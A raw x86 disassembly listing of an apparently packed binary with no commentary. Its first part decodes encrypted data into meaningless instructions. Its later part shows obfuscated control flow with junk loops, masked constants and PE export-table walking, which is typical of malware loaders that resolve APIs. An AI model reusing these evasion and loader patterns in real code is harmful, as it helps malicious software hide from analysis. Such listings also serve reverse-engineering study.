  4046be:	in     al,dx
  4046bf:	xchg   ecx,eax
  4046c0:	iret   
  4046c1:	jns    0x4046c2
  4046c3:	sub    dh,dh
  4046c5:	jnp    0x4046cc
  4046c7:	inc    ebp
  4046c8:	push   ebp
  4046c9:	mov    al,ds:0xe0f0c078
  4046ce:	lahf   
  4046cf:	das    
  4046d0:	push   esp
  4046d1:	repz pusha 
  4046d3:	inc    edi
  4046d4:	sub    BYTE PTR [ecx+0x2d],cl
  4046d7:	lea    ebp,[ebp-0x2507a45c]
  4046dd:	rcr    esp,cl
  4046df:	fadd   DWORD PTR [eax+0x3d]
  4046e2:	xchg   ecx,eax
  4046e3:	dec    edx
  4046e4:	pop    edx
  4046e5:	jnp    0x4046c9
  4046e7:	or     eax,0xb9aadabe
  4046ec:	dec    esp
  4046ed:	mov    ecx,0x74cfacdd
  4046f2:	(bad)  
  4046f3:	mov    ch,0x8a
  4046f5:	push   es
  4046f6:	mov    dh,0x64
  4046f8:	jns    0x404703
  4046fa:	shl    DWORD PTR [edi+0x392f8883],0x44
  404701:	jne    0x404728
  404703:	addr16 retf 0x1e9b
  404707:	ja     0x40471a
  404709:	scas   al,BYTE PTR es:[edi]
  40470a:	or     eax,0x57dda32d
  40470f:	ret    
  404710:	pop    ebp
  404711:	jne    0x404702
  404713:	sti    
  404714:	out    0xab,eax
  404716:	xor    ah,BYTE PTR [edx]
  404718:	mov    bh,0xd3
  40471a:	mov    WORD PTR [edi],?
  40471c:	inc    ebx
  40471d:	sbb    al,0x71
  40471f:	in     al,0xc5
  404721:	add    al,0xfb
  404723:	inc    esp
  404724:	jb     0x4046c2
  404726:	mov    cl,0x72
  404728:	jo     0x404735
  40472a:	push   cs
  40472b:	inc    esp
  40472c:	add    ah,BYTE PTR [esi-0x2a]
  40472f:	not    DWORD PTR [esi]
  404731:	jmp    0x1186:0x5d63a9be
  404738:	shl    eax,1
  40473a:	push   es
  40473b:	or     esp,DWORD PTR [ecx]
  40473d:	add    BYTE PTR [edx],al
  40473f:	stos   DWORD PTR es:[edi],eax
  404740:	das    
  404741:	mov    ah,0x68
  404743:	outs   dx,BYTE PTR ds:[esi]
  404744:	fdiv   QWORD PTR [esi-0x5f]
  404747:	(bad)  
  404748:	stc    
  404749:	addr16 pop bx
  40474c:	sub    al,0x6c
  40474e:	addr16 aam 0xb5
  404751:	sub    eax,0x1ac0e021
  404756:	cmp    DWORD PTR [edi+ebp*2],esi
  404759:	(bad)  
  40475b:	mul    dh
  40475d:	iret   
  40475e:	xor    DWORD PTR [ecx+0x41],edi
  404761:	dec    edi
  404762:	popf   
  404763:	dec    eax
  404764:	xchg   edx,eax
  404765:	(bad)  [ecx+eax*2-0x49930089]
  40476c:	sub    esp,0x390cdf6f
  404772:	icebp  
  404773:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404774:	mov    bl,0x31
  404776:	sub    eax,0xfc397348
  40477b:	jge    0x4047dd
  40477d:	dec    ecx
  40477e:	xlat   BYTE PTR ds:[ebx]
  40477f:	xor    bh,BYTE PTR [ebx+esi*8]
  404782:	in     eax,dx
  404783:	ins    DWORD PTR es:[edi],dx
  404784:	(bad)  
  404785:	bnd jbe 0x4047e2
  404788:	imul   DWORD PTR [esp+edi*4]
  40478b:	dec    ebx
  40478c:	add    al,0xf7
  40478e:	pop    es
  40478f:	(bad)  [esp+edx*4-0x42]
  404793:	xchg   eax,ebx
  404795:	stos   DWORD PTR es:[edi],eax
  404796:	(bad)  
  404797:	fstp   TBYTE PTR [edx+0x4c095aa]
  40479d:	pop    ds
  40479e:	iret   
  40479f:	jbe    0x4047a8
  4047a1:	xchg   esi,eax
  4047a2:	push   edx
  4047a3:	pop    edi
  4047a4:	out    0xe3,al
  4047a6:	popf   
  4047a7:	shr    DWORD PTR [ecx+0x7d66fe02],cl
  4047ad:	xor    edx,DWORD PTR [ebx-0x147f3e37]
  4047b3:	repz xchg esp,eax
  4047b5:	mov    DWORD PTR [ebx+edx*1-0x42c2eda7],eax
  4047bc:	in     al,dx
  4047bd:	cwde   
  4047be:	imul   esi,ebp,0x39c2ddc2
  4047c4:	std    
  4047c5:	neg    DWORD PTR [edi+0x6b]
  4047c8:	loop   0x404805
  4047ca:	dec    ebx
  4047cb:	clc    
  4047cc:	sub    edx,DWORD PTR [esi-0x4a582668]
  4047d2:	call   0x53f6bd02
  4047d7:	jl     0x40481a
  4047d9:	jg     0x40477f
  4047db:	lahf   
  4047dc:	cld    
  4047dd:	int3   
  4047de:	aas    
  4047df:	(bad)  
  4047e0:	pop    ebx
  4047e1:	loopne 0x4047d9
  4047e3:	push   esp
  4047e4:	not    DWORD PTR [esi-0x74e2dac8]
  4047ea:	lods   al,BYTE PTR ds:[esi]
  4047eb:	sbb    edx,edx
  4047ed:	add    BYTE PTR [ebx+0x46c73d0a],ch
  4047f3:	popa   
  4047f4:	test   al,0x81
  4047f6:	stos   BYTE PTR es:[edi],al
  4047f7:	outs   dx,BYTE PTR ds:[esi]
  4047f8:	pop    ds
  4047f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4047fa:	imul   DWORD PTR ds:0xd89742d7
  404800:	jmp    0x404827
  404802:	clc    
  404803:	fwait
  404804:	sar    DWORD PTR [eax-0x11],cl
  404807:	push   eax
  404808:	call   0x6e453a05
  40480d:	adc    ebp,DWORD PTR [ebx+0x252c5392]
  404813:	aad    0x11
  404815:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404816:	xchg   ebx,eax
  404817:	popf   
  404818:	outs   dx,DWORD PTR ds:[esi]
  404819:	clc    
  40481a:	xchg   ah,dh
  40481c:	mov    DWORD PTR [ebp+ecx*1-0x45],edx
  404820:	mov    edi,0xf4fae8c
  404825:	xchg   bh,bh
  404827:	push   esi
  404828:	adc    ecx,DWORD PTR [ebp+0x67ecbfeb]
  40482e:	jge    0x4047ba
  404830:	cld    
  404831:	aad    0x23
  404833:	mov    eax,ds:0x6b2c170f
  404838:	push   eax
  404839:	and    bh,BYTE PTR [eax-0x1f392fff]
  40483f:	xchg   ebp,eax
  404840:	jle    0x4048b7
  404842:	mov    edx,0xd87fd622
  404847:	loope  0x404875
  404849:	cdq    
  40484a:	fadd   st,st(2)
  40484c:	addr16 push es
  40484e:	dec    ebp
  40484f:	push   cs
  404850:	repnz lods al,BYTE PTR ds:[esi]
  404852:	int    0xf8
  404854:	cli    
  404855:	jmp    0x404800
  404857:	pop    edi
  404858:	mov    es,WORD PTR [edx+0x6adf56af]
  40485e:	fucomp st(7)
  404860:	cmc    
  404861:	push   ds
  404862:	pop    edi
  404863:	mov    ds:0x4bfb1886,al
  404868:	and    al,0x59
  40486a:	fs dec ebx
  40486c:	mov    ch,0x33
  40486e:	test   al,0x71
  404870:	jbe    0x40483c
  404872:	ja     0x4047f9
  404874:	je     0x4048b6
  404876:	mov    bh,0xe3
  404878:	or     DWORD PTR [ebx-0x78],ebp
  40487b:	jge    0x4048a5
  40487d:	lods   eax,DWORD PTR ds:[esi]
  40487e:	test   al,0x3
  404880:	rol    DWORD PTR [ecx],0x86
  404883:	inc    ebx
  404884:	mov    WORD PTR [ecx],fs
  404886:	pop    esp
  404887:	cli    
  404888:	call   0x34bb04d5
  40488d:	mov    dl,0x2b
  40488f:	out    dx,eax
  404890:	shr    DWORD PTR [esi-0x2],cl
  404893:	lock es in al,0xec
  404897:	inc    ebx
  404898:	aam    0xb0
  40489a:	dec    esi
  40489b:	pop    ss
  40489c:	jbe    0x404892
  40489e:	dec    edi
  40489f:	in     al,0x5d
  4048a1:	and    eax,0x10a32bfb
  4048a6:	mov    al,ds:0x4e44c06c
  4048ab:	neg    edx
  4048ad:	sbb    edx,DWORD PTR [ebp-0x6c]
  4048b0:	test   al,0xaf
  4048b2:	inc    ecx
  4048b3:	cmp    eax,0xfe64e368
  4048b8:	imul   ecx,edx,0xffffff8e
  4048bb:	leave  
  4048bc:	pop    esp
  4048bd:	in     eax,0x2d
  4048bf:	not    DWORD PTR [eax-0x1b]
  4048c2:	sub    bl,cl
  4048c4:	push   edx
  4048c5:	ret    0x2e67
  4048c8:	xor    edx,edx
  4048ca:	popa   
  4048cb:	jo     0x404949
  4048cd:	(bad)  
  4048cf:	add    esi,DWORD PTR [eax-0x6d]
  4048d2:	loop   0x40485e
  4048d4:	add    al,0xd3
  4048d6:	mov    bh,0x90
  4048d8:	(bad)  
  4048d9:	push   eax
  4048da:	inc    DWORD PTR [ecx+0x22]
  4048dd:	sbb    edx,DWORD PTR [ecx+0x56]
  4048e0:	dec    ebp
  4048e1:	test   eax,0x8500004a
  4048e6:	mov    ebp,0xa544a05a
  4048eb:	js     0x40489e
  4048ed:	outs   dx,BYTE PTR ds:[esi]
  4048ee:	pop    eax
  4048ef:	xchg   DWORD PTR ss:[ecx+ebx*4-0x2fef0179],ebx
  4048f7:	fsub   QWORD PTR [edi+ecx*1+0x69]
  4048fb:	mov    edi,0x69455b10
  404900:	adc    eax,0x39ad1757
  404905:	lahf   
  404906:	jns    0x4048c9
  404908:	mov    cl,0x67
  40490a:	xor    DWORD PTR [ebx+0x19b024fc],eax
  404910:	mov    ds:0x8a8f9bf3,al
  404915:	cli    
  404916:	(bad)  
  404917:	pop    ecx
  404918:	pop    ebx
  404919:	jp     0x40491f
  40491b:	mov    ecx,0x5451801b
  404920:	in     al,0x66
  404922:	retf   0x8906
  404925:	dec    BYTE PTR ds:0xb8e02272
  40492b:	in     al,0xae
  40492d:	push   cs
  40492e:	jbe    0x40499b
  404930:	jl     0x404901
  404932:	pop    ss
  404933:	jge    0x4048f2
  404935:	clc    
  404936:	jmp    0x692a:0x91406f4f
  40493d:	cld    
  40493e:	(bad)  
  40493f:	and    DWORD PTR [ebp+0x7d],ebx
  404942:	sub    DWORD PTR [esi+0x4415edc7],esi
  404948:	sbb    BYTE PTR [edx+ebx*8+0x6f60f087],dl
  40494f:	mov    ds:0x76b86a18,al
  404954:	stos   DWORD PTR es:[edi],eax
  404955:	psrlq  mm3,QWORD PTR [ebp+0x3fba3400]
  40495c:	adc    eax,DWORD PTR [ebx+esi*1+0x2d]
  404960:	lds    esp,FWORD PTR [ebp+0x77469b2a]
  404966:	jge    0x4048ec
  404968:	je     0x404914
  40496a:	push   ecx
  40496b:	(bad)  
  40496c:	cld    
  40496d:	popa   
  40496e:	dec    ebp
  40496f:	mov    cl,BYTE PTR [edi]
  404971:	jmp    0xb3d7a140
  404976:	and    al,0xf4
  404978:	repnz cmp al,0x87
  40497b:	pop    eax
  40497c:	in     eax,0xd6
  40497e:	pop    edx
  40497f:	scas   al,BYTE PTR es:[edi]
  404980:	xchg   BYTE PTR [ebx],ch
  404982:	iret   
  404983:	std    
  404984:	cmp    bl,BYTE PTR [ebp+0x5ab67ee0]
  40498a:	sar    DWORD PTR [edi+0x64],1
  40498d:	hlt    
  40498e:	mov    al,0x4
  404990:	push   ebp
  404991:	and    dh,BYTE PTR [eax+0x22]
  404994:	repnz pop edi
  404996:	push   esi
  404997:	or     esi,0x64f0
  40499d:	mov    edx,0x751089b
  4049a2:	add    DWORD PTR ds:0x435018,0x3361
  4049ac:	xor    ecx,edx
  4049ae:	and    DWORD PTR ds:0x435010,0x0
  4049b8:	xor    esi,esi
  4049ba:	or     esi,DWORD PTR ds:0x435010
  4049c0:	inc    esi
  4049c1:	mov    DWORD PTR ds:0x435010,esi
  4049c7:	cmp    DWORD PTR ds:0x435010,0xb
  4049ce:	jl     0x404a0b
  4049d4:	jmp    0x4049e4
  4049d9:	push   0x1955
  4049de:	call   DWORD PTR ds:0x43a8c4
  4049e4:	cmp    DWORD PTR ds:0x435010,0xa
  4049eb:	jne    0x4049fe
  4049f1:	mov    esi,DWORD PTR ds:0x435010
  4049f7:	inc    esi
  4049f8:	mov    DWORD PTR ds:0x435010,esi
  4049fe:	cmp    DWORD PTR ds:0x435010,0x1c
  404a05:	jb     0x4049b8
  404a0b:	mov    esi,0x3272e2
  404a10:	or     DWORD PTR ds:0x436018,0x436014
  404a1a:	push   edi
  404a1b:	add    edi,DWORD PTR ds:0x43800c
  404a21:	mov    edi,DWORD PTR [ebp+0x10]
  404a24:	add    ecx,esi
  404a26:	mov    DWORD PTR ds:0x43500c,0x38f3
  404a30:	cmp    ecx,edi
  404a32:	mov    DWORD PTR ds:0x43401c,0x3286
  404a3c:	je     0x404b8f
  404a42:	mov    ecx,DWORD PTR [ebp-0x4]
  404a45:	sbb    edi,DWORD PTR ds:0x435014
  404a4b:	mov    edi,DWORD PTR [ebp+0x10]
  404a4e:	xor    eax,eax
  404a50:	xor    DWORD PTR ds:0x435018,0x434028
  404a5a:	xor    ecx,edx
  404a5c:	add    ecx,esi
  404a5e:	mov    DWORD PTR ds:0x434024,0x7740
  404a68:	add    edi,0xfabdbee7
  404a6e:	adc    eax,0xffffffff
  404a71:	inc    DWORD PTR ds:0x437010
  404a77:	xor    eax,0x0
  404a7a:	or     DWORD PTR ds:0x438008,0x434024
  404a84:	mov    DWORD PTR [ebp-0xc],eax
  404a87:	push   ebx
  404a88:	xor    ebx,ebx
  404a8a:	adc    DWORD PTR ds:0x43400c,0x682
  404a94:	xor    edi,0x8a29a12d
  404a9a:	mov    DWORD PTR ds:0x436008,0x12
  404aa4:	cmp    DWORD PTR ds:0x436008,0x0
  404aab:	je     0x404af4
  404ab1:	cmp    DWORD PTR ds:0x436008,0x3
  404ab8:	jle    0x404af4
  404abe:	jmp    0x404acc
  404ac3:	push   DWORD PTR [ebp-0x18]
  404ac6:	call   DWORD PTR ds:0x43a8c8
  404acc:	cmp    DWORD PTR ds:0x436008,0x4
  404ad3:	jne    0x404ae4
  404ad9:	mov    eax,ds:0x436008
  404ade:	dec    eax
  404adf:	mov    ds:0x436008,eax
  404ae4:	mov    eax,ds:0x436008
  404ae9:	dec    eax
  404aea:	mov    ds:0x436008,eax
  404aef:	jmp    0x404aa4
  404af4:	mov    eax,ecx
  404af6:	add    eax,0xfabdbee7
  404afb:	adc    ebx,0xffffffff
  404afe:	xor    eax,0x8a29a12d
  404b03:	xor    ebx,0x0
  404b06:	cmp    eax,edi
  404b08:	jne    0x404b21
  404b0e:	cmp    ebx,DWORD PTR [ebp-0xc]
  404b11:	je     0x404b89
  404b17:	jmp    0x404b21
  404b1c:	mov    esi,0x3272e2
  404b21:	mov    eax,DWORD PTR [ebp-0x4]
  404b24:	mov    edi,DWORD PTR [ebp-0x8]
  404b27:	xor    edi,edx
  404b29:	add    edi,esi
  404b2b:	mov    esi,DWORD PTR [ebp+0x8]
  404b2e:	imul   edi,ecx
  404b31:	mov    ebx,DWORD PTR [ebp+0xc]
  404b34:	xor    eax,edx
  404b36:	add    eax,ecx
  404b38:	mov    al,BYTE PTR [ebx+eax*1+0x3272e2]
  404b3f:	mov    BYTE PTR [edi+esi*1],al
  404b42:	mov    eax,DWORD PTR [ebp-0x8]
  404b45:	mov    esi,DWORD PTR [ebp+0x10]
  404b48:	xor    eax,edx
  404b4a:	xor    ebx,ebx
  404b4c:	add    esi,0xfabdbee7
  404b52:	adc    ebx,0xffffffff
  404b55:	lea    ecx,[ecx+eax*1+0x3272e2]
  404b5c:	xor    edi,edi
  404b5e:	xor    esi,0x8a29a12d
  404b64:	xor    ebx,0x0
  404b67:	mov    eax,ecx
  404b69:	add    eax,0xfabdbee7
  404b6e:	adc    edi,0xffffffff
  404b71:	xor    eax,0x8a29a12d
  404b76:	xor    edi,0x0
  404b79:	cmp    eax,esi
  404b7b:	jne    0x404b1c
  404b81:	cmp    edi,ebx
  404b83:	jne    0x404b1c
  404b89:	mov    eax,0xf89c8584
  404b8e:	pop    ebx
  404b8f:	pop    edi
  404b90:	pop    esi
  404b91:	leave  
  404b92:	ret    0xc
  404b95:	push   ebp
  404b96:	mov    ebp,esp
  404b98:	push   ecx
  404b99:	add    DWORD PTR ds:0x43701c,0x56ef
  404ba3:	mov    DWORD PTR [ebp-0x4],0xf89c8585
  404baa:	mov    eax,DWORD PTR [ebp+0x8]
  404bad:	movsx  eax,BYTE PTR [eax]
  404bb0:	and    DWORD PTR ds:0x436004,0x0
  404bba:	mov    ecx,DWORD PTR ds:0x436004
  404bc0:	inc    ecx
  404bc1:	mov    DWORD PTR ds:0x436004,ecx
  404bc7:	cmp    DWORD PTR ds:0x436004,0x6
  404bce:	ja     0x404c0b
  404bd4:	jmp    0x404be4
  404bd9:	push   0x43a0c9
  404bde:	call   DWORD PTR ds:0x43a8d0
  404be4:	cmp    DWORD PTR ds:0x436004,0x5
  404beb:	jne    0x404bfe
  404bf1:	mov    ecx,DWORD PTR ds:0x436004
  404bf7:	inc    ecx
  404bf8:	mov    DWORD PTR ds:0x436004,ecx
  404bfe:	cmp    DWORD PTR ds:0x436004,0x18
  404c05:	jb     0x404bba
  404c0b:	mov    edx,0x3272e2
  404c10:	neg    ecx
  404c12:	sub    eax,edx
  404c14:	mov    ecx,0x751089b
  404c19:	xor    eax,ecx
  404c1b:	mov    DWORD PTR ds:0x43600c,0x18ff
  404c25:	cmp    eax,0xf89c85f0
  404c2a:	jne    0x404c59
  404c30:	mov    eax,DWORD PTR [ebp+0x8]
  404c33:	push   esi
  404c34:	mov    esi,DWORD PTR [ebp+0x8]
  404c37:	add    esi,DWORD PTR [eax+0x3c]
  404c3a:	mov    DWORD PTR [ebp+0x8],esi
  404c3d:	mov    eax,DWORD PTR [ebp-0x4]
  404c40:	mov    esi,DWORD PTR [ebp+0x8]
  404c43:	xor    eax,ecx
  404c45:	add    eax,edx
  404c47:	cmp    DWORD PTR [esi+0x54],eax
  404c4a:	pop    esi
  404c4b:	je     0x404c59
  404c51:	mov    eax,DWORD PTR [ebp+0x8]
  404c54:	jmp    0x404c60
  404c59:	mov    eax,DWORD PTR [ebp-0x4]
  404c5c:	xor    eax,ecx
  404c5e:	add    eax,edx
  404c60:	leave  
  404c61:	ret    0x4
  404c64:	push   ebp
  404c65:	mov    ebp,esp
  404c67:	sub    esp,0x38
  404c6a:	or     DWORD PTR ds:0x43500c,0x434024
  404c74:	mov    DWORD PTR [ebp-0x4],0xf89c8585
  404c7b:	mov    eax,ds:0x437004
  404c80:	or     DWORD PTR ds:0x434004,eax
  404c86:	push   ebx
  404c87:	mov    DWORD PTR [ebp-0xc],0xf89c8584
  404c8e:	adc    DWORD PTR ds:0x434020,edi
  404c94:	mov    eax,DWORD PTR [ebp-0x4]
  404c97:	xor    DWORD PTR ds:0x437018,0x773f
  404ca1:	push   esi
  404ca2:	xor    DWORD PTR ds:0x435010,0x4a66
  404cac:	mov    esi,0x751089b
  404cb1:	and    DWORD PTR ds:0x435018,0x354c
  404cbb:	xor    eax,esi
  404cbd:	not    DWORD PTR ds:0x436018
  404cc3:	push   edi
  404cc4:	mov    edi,0x3272e2
  404cc9:	add    eax,edi
  404ccb:	xor    DWORD PTR ds:0x434018,0x434000
  404cd5:	mov    DWORD PTR [ebp-0x1c],eax
  404cd8:	and    DWORD PTR ds:0x438010,0x0
  404ce2:	mov    eax,ds:0x438010
  404ce7:	inc    eax
  404ce8:	mov    ds:0x438010,eax
  404ced:	cmp    DWORD PTR ds:0x438010,0xb
  404cf4:	jb     0x404d2f
  404cfa:	jmp    0x404d0a
  404cff:	push   0x43a097
  404d04:	call   DWORD PTR ds:0x43a8d4
  404d0a:	cmp    DWORD PTR ds:0x438010,0xa
  404d11:	jne    0x404d22
  404d17:	mov    eax,ds:0x438010
  404d1c:	inc    eax
  404d1d:	mov    ds:0x438010,eax
  404d22:	cmp    DWORD PTR ds:0x438010,0x14
  404d29:	jb     0x404ce2
  404d2f:	mov    eax,DWORD PTR [ebp+0x14]
  404d32:	sbb    DWORD PTR ds:0x437008,0x2430
  404d3c:	test   eax,eax
  404d3e:	je     0x404d99
  404d44:	and    DWORD PTR ds:0x438000,edx
  404d4a:	mov    eax,DWORD PTR [ebp+0x14]
  404d4d:	and    DWORD PTR ds:0x435014,0x0
  404d57:	xor    ebx,ebx
  404d59:	add    ebx,DWORD PTR ds:0x435014
  404d5f:	inc    ebx
  404d60:	mov    DWORD PTR ds:0x435014,ebx
  404d66:	cmp    DWORD PTR ds:0x435014,0x29
  404d6d:	jl     0x404d8e
  404d73:	jmp    0x404d81
  404d78:	push   DWORD PTR [ebp-0x24]
  404d7b:	call   DWORD PTR ds:0x43a8dc
  404d81:	cmp    DWORD PTR ds:0x435014,0x1a
  404d88:	jb     0x404d57
  404d8e:	mov    eax,DWORD PTR [eax]
  404d90:	or     ebx,DWORD PTR ds:0x438014
  404d96:	mov    DWORD PTR [ebp-0x1c],eax
  404d99:	or     DWORD PTR ds:0x436008,0x1828
  404da3:	mov    eax,DWORD PTR [ebp-0x4]
  404da6:	adc    DWORD PTR ds:0x437014,edi
  404dac:	xor    eax,esi
  404dae:	xor    ebx,ebx
  404db0:	or     ebx,DWORD PTR ds:0x436018
  404db6:	xor    DWORD PTR ds:0x434004,ebx
  404dbc:	add    eax,edi
  404dbe:	mov    DWORD PTR [ebp-0x8],eax
  404dc1:	add    DWORD PTR ds:0x43601c,0x710e
  404dcb:	mov    eax,DWORD PTR [ebp-0xc]
  404dce:	xor    ebx,ebx
  404dd0:	add    ebx,DWORD PTR ds:0x438008
  404dd6:	and    DWORD PTR ds:0x438018,ebx
  404ddc:	xor    eax,esi
  404dde:	and    DWORD PTR ds:0x438010,0x0
  404de8:	xor    ebx,ebx
  404dea:	add    ebx,DWORD PTR ds:0x438010
  404df0:	inc    ebx
  404df1:	mov    DWORD PTR ds:0x438010,ebx
  404df7:	cmp    DWORD PTR ds:0x438010,0x29
  404dfe:	jg     0x404e2c
  404e04:	jmp    0x404e1f
  404e09:	push   0x43a097
  404e0e:	push   DWORD PTR [ebp-0x24]
  404e11:	push   0x5041
  404e16:	push   DWORD PTR [ebp-0x1c]
  404e19:	call   DWORD PTR ds:0x43a8e0
  404e1f:	cmp    DWORD PTR ds:0x438010,0x1d
  404e26:	jb     0x404de8
  404e2c:	add    eax,edi
  404e2e:	movzx  ebx,WORD PTR ds:0x434018
  404e35:	sbb    ebx,DWORD PTR ds:0x434000
  404e3b:	mov    DWORD PTR ds:0x434018,ebx
  404e41:	mov    DWORD PTR [ebp-0x24],eax
  404e44:	mov    eax,DWORD PTR [ebp-0x4]
  404e47:	and    DWORD PTR ds:0x437004,edx
  404e4d:	xor    eax,esi
  404e4f:	add    eax,edi
  404e51:	add    DWORD PTR ds:0x43600c,0x546e
  404e5b:	mov    DWORD PTR [ebp-0x30],eax
  404e5e:	sub    eax,ebx
  404e60:	mov    ebx,DWORD PTR [ebp-0x4]
  404e63:	sub    DWORD PTR ds:0x435008,0x4ecf
  404e6d:	xor    ebx,esi
  404e6f:	sub    DWORD PTR ds:0x436004,edx
  404e75:	add    ebx,edi
  404e77:	adc    DWORD PTR ds:0x438000,0x4ed2
  404e81:	mov    eax,DWORD PTR [ebp-0x24]
  404e84:	xor    DWORD PTR ds:0x435018,0x43700c
  404e8e:	sub    eax,edi
  404e90:	lea    ecx,[ebx-0x3272e2]
  404e96:	xor    eax,esi
  404e98:	adc    DWORD PTR ds:0x436010,0x436014
  404ea2:	xor    ecx,esi
  404ea4:	mov    DWORD PTR ds:0x438004,0x37e0
  404eae:	cmp    ecx,eax
  404eb0:	mov    DWORD PTR ds:0x437000,0x70b7
  404eba:	je     0x4051ec
  404ec0:	and    DWORD PTR ds:0x43701c,0x0
  404eca:	xor    eax,eax
  404ecc:	or     eax,DWORD PTR ds:0x43701c
  404ed2:	inc    eax
  404ed3:	mov    ds:0x43701c,eax
  404ed8:	cmp    DWORD PTR ds:0x43701c,0x6
  404edf:	ja     0x404f2d
  404ee5:	jmp    0x404f08
  404eea:	push   DWORD PTR [ebp-0xc]
  404eed:	push   0x434024
  404ef2:	push   DWORD PTR [ebp-0x10]
  404ef5:	push   0x43a000
  404efa:	push   0x794f
  404eff:	push   DWORD PTR [ebp-0x28]
  404f02:	call   DWORD PTR ds:0x43a8e4
  404f08:	cmp    DWORD PTR ds:0x43701c,0x5
  404f0f:	jne    0x404f20
  404f15:	mov    eax,ds:0x43701c
  404f1a:	inc    eax
  404f1b:	mov    ds:0x43701c,eax
  404f20:	cmp    DWORD PTR ds:0x43701c,0x10
  404f27:	jb     0x404eca
  404f2d:	mov    eax,DWORD PTR [ebp-0x4]
  404f30:	xor    eax,esi
  404f32:	sub    DWORD PTR ds:0x435000,0x434020
  404f3c:	add    eax,edi
  404f3e:	cmp    ebx,eax
  404f40:	jne    0x4051c9
  404f46:	adc    DWORD PTR ds:0x437008,0x435000
  404f50:	push   DWORD PTR [ebp+0x8]
  404f53:	adc    DWORD PTR ds:0x43600c,0x30f1
  404f5d:	call   0x404b95
  404f62:	mov    ecx,DWORD PTR ds:0x437010
  404f68:	sub    DWORD PTR ds:0x434024,ecx
  404f6e:	mov    DWORD PTR [ebp-0x14],eax
  404f71:	and    DWORD PTR ds:0x437014,0x0
  404f7b:	mov    eax,ds:0x437014
  404f80:	inc    eax
  404f81:	mov    ds:0x437014,eax
  404f86:	cmp    DWORD PTR ds:0x437014,0x5
  404f8d:	jl     0x404fd1
  404f93:	jmp    0x404fac
  404f98:	push   DWORD PTR [ebp-0x1c]
  404f9b:	push   0x89c7
  404fa0:	push   DWORD PTR [ebp-0x20]
  404fa3:	push   DWORD PTR [ebp-0x28]
  404fa6:	call   DWORD PTR ds:0x43a8e8
  404fac:	cmp    DWORD PTR ds:0x437014,0x4
  404fb3:	jne    0x404fc4
  404fb9:	mov    eax,ds:0x437014
  404fbe:	inc    eax
  404fbf:	mov    ds:0x437014,eax
  404fc4:	cmp    DWORD PTR ds:0x437014,0x1b
  404fcb:	jb     0x404f7b
  404fd1:	mov    eax,DWORD PTR [ebp-0x4]
  404fd4:	add    ecx,0x29bc
  404fda:	mov    ecx,DWORD PTR [ebp-0x14]
  404fdd:	or     DWORD PTR ds:0x43401c,0x7fb4
  404fe7:	xor    eax,esi
  404fe9:	add    eax,edi
  404feb:	cmp    ecx,eax
  404fed:	je     0x405257
  404ff3:	push   DWORD PTR [ebp-0x14]
  404ff6:	and    DWORD PTR ds:0x438000,0x39ab
  405000:	push   DWORD PTR [ebp+0x8]
  405003:	xor    DWORD PTR ds:0x437010,0x438000
  40500d:	call   0x40a3b2
  405012:	sbb    DWORD PTR ds:0x438014,0x3483
  40501c:	mov    DWORD PTR [ebp-0x14],eax
  40501f:	or     ecx,0x551e
  405025:	mov    eax,DWORD PTR [ebp-0x4]
  405028:	mov    ecx,DWORD PTR ds:0x434010
  40502e:	or     DWORD PTR ds:0x437014,ecx
  405034:	mov    ecx,DWORD PTR [ebp-0x14]
  405037:	sub    DWORD PTR ds:0x43801c,0xa60
  405041:	xor    eax,esi
  405043:	add    eax,edi
  405045:	mov    DWORD PTR ds:0x435004,0x1802
  40504f:	cmp    ecx,eax
  405051:	je     0x405257
  405057:	mov    DWORD PTR ds:0x43701c,0x15
  405061:	cmp    DWORD PTR ds:0x43701c,0x0
  405068:	je     0x4050b4
  40506e:	cmp    DWORD PTR ds:0x43701c,0xa
  405075:	jb     0x4050b4
  40507b:	jmp    0x405086
  405080:	call   DWORD PTR ds:0x43a8f0
  405086:	cmp    DWORD PTR ds:0x43701c,0xb
  40508d:	jne    0x4050a0
  405093:	mov    ecx,DWORD PTR ds:0x43701c
  405099:	dec    ecx
  40509a:	mov    DWORD PTR ds:0x43701c,ecx
  4050a0:	xor    ecx,ecx
  4050a2:	or     ecx,DWORD PTR ds:0x43701c
  4050a8:	dec    ecx
  4050a9:	mov    DWORD PTR ds:0x43701c,ecx
  4050af:	jmp    0x405061
  4050b4:	mov    eax,DWORD PTR [ebp-0x14]
  4050b7:	sub    DWORD PTR ds:0x436010,edi
  4050bd:	mov    eax,DWORD PTR [eax+0x18]
  4050c0:	adc    DWORD PTR ds:0x436000,ebx
  4050c6:	mov    DWORD PTR [ebp-0x24],eax
  4050c9:	mov    DWORD PTR ds:0x434028,0x1f
  4050d3:	cmp    DWORD PTR ds:0x434028,0x0
  4050da:	je     0x40510b
  4050e0:	cmp    DWORD PTR ds:0x434028,0x27
  4050e7:	jl     0x40510b
  4050ed:	jmp    0x4050fb
  4050f2:	push   DWORD PTR [ebp-0x14]
  4050f5:	call   DWORD PTR ds:0x43a8f4
  4050fb:	mov    eax,ds:0x434028
  405100:	dec    eax
  405101:	mov    ds:0x434028,eax
  405106:	jmp    0x4050d3
  40510b:	mov    eax,DWORD PTR [ebp-0x14]
  40510e:	or     ecx,0x2a6b
  405114:	mov    ecx,DWORD PTR [ebp+0x8]
  405117:	xor    DWORD PTR ds:0x438000,0x69f8
  405121:	add    ecx,DWORD PTR [eax+0x20]
  405124:	sbb    DWORD PTR ds:0x436014,0x3915
  40512e:	mov    DWORD PTR [ebp-0x2c],ecx
  405131:	mov    eax,DWORD PTR [ebp-0x14]
  405134:	mov    ecx,DWORD PTR ds:0x43700c
  40513a:	xor    DWORD PTR ds:0x434008,ecx
  405140:	mov    ecx,DWORD PTR [ebp+0x8]
  405143:	add    ecx,DWORD PTR [eax+0x24]
  405146:	xor    eax,eax
  405148:	add    eax,DWORD PTR ds:0x434008
  40514e:	xor    DWORD PTR ds:0x437014,eax
  405154:	mov    DWORD PTR [ebp-0x34],ecx
  405157:	mov    DWORD PTR ds:0x438000,0x1b
  405161:	cmp    DWORD PTR ds:0x438000,0x0
  405168:	je     0x4051b8
  40516e:	cmp    DWORD PTR ds:0x438000,0x3
  405175:	jbe    0x4051b8
  40517b:	jmp    0x40518c
  405180:	push   DWORD PTR [ebp-0x28]
  405183:	push   DWORD PTR [ebp-0xc]
  405186:	call   DWORD PTR ds:0x43a8f8
  40518c:	cmp    DWORD PTR ds:0x438000,0x4
  405193:	jne    0x4051a6
  405199:	mov    ecx,DWORD PTR ds:0x438000
